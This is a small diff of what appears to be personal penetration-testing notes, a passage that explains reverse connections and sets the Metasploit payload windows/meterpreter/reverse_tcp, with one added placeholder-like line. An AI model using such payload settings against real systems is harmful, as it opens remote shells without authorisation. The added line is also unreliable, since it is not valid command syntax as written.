@@ -186,6 +186,7 @@ Exploitation>
 							//instead of creating a listening service waiting for us to connect, the target will instead connect back to us.
 							//Outbound connections aren't normally protected by firewalls
 				set PAYLOAD windows/meterpreter/reverse_tcp
+                set use [lastSearchNumber]
 				//Set options
 					options
 					//Set technique, EG powershell scripts
